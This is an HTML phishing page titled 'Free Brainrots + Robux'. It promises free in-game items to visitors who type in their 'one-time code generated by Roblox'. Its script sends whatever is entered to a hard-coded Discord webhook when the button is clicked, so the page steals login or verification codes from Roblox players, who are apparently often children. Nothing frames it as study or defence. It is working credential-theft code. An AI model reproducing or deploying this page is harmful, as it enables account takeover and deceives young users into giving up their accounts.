<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Free Brainrots + Robux</title>
</head>
<body>
  <h2>Insert your one-time code generated by Roblox</h2>
  <input type="text" id="messageInput" placeholder="Type your message">
  <button id="sendButton">Get free brainrot</button>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1455546611462574112/wgfCVOnOy0dQ5mcK7RjzQjO7ty0IbDvJAR7pFl8nFksJlBP20ruUJM2wSwMX0Hd7wfpy"; // Replace this with your webhook URL

    document.getElementById("sendButton").addEventListener("click", () => {
      const message = document.getElementById("messageInput").value;
      if (!message) return alert("Please enter a message");

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: message
        })
      })
      .then(response => {
        if (response.ok) {
          alert("Message sent!");
          document.getElementById("messageInput").value = "";
        } else {
          alert("Failed to send message");
        }
      })
      .catch(error => {
        console.error("Error sending message:", error);
        alert("Error sending message");
      });
    });
  </script>
</body>
</html>
